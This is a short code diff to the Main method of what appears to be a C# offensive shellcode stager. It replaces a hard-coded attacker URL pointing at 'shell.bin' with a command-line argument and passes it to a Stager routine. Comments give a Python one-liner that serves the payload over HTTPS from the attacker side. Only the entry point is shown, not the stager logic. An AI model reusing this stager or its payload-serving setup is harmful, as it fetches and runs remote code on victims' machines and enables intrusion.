@@ -29,11 +29,10 @@ public class Program {
 
 
 
-  public static void Main(){
-    string url = "http://10.11.98.53/shell.bin";//replace url with your url (attacker url)
+  public static void Main(string[] args){
+    string url = args[0];//replace url with your url (attacker url), or provide the url as command line argument
     //url could be http or https(you must set python https server by:
     //python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
-)
     Stager(url);
   }
 
